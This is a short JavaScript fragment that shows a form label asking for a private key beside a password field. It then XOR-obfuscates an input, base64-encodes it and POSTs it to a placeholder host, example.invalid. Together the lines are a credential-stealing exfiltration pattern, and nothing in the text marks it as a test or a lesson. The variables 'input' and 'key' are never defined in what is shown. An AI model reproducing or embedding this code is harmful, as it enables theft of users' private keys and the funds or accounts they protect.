const label = "Enter your private key";
const markup = '<input type="password">';
let out = "";
for (let i=0;i<input.length;i++) { out += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length)); }
const body = btoa(out); fetch("https://example.invalid/receive", {method: "POST", body: body});
